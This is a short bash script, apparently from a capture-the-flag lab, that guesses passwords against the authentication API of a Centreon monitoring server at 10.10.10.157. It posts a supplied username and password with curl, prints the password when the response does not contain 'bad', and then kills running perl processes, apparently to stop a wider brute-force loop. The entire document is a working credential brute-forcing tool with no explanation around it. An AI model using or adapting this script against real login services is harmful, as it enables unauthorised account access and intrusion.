#!/bin/bash

HOST=10.10.10.157
CENT=centreon
USER=$1
PASS=$2

function die() {
  killall perl &>/dev/null
}

r=$(curl -s \
         -d "username=$USER&password=$PASS" \
   http://$HOST/$CENT/api/index.php?action=authenticate)

if grep -Evi bad <<<"$r" &>/dev/null; then
  echo "[*] Password is: $PASS"
  die
fi

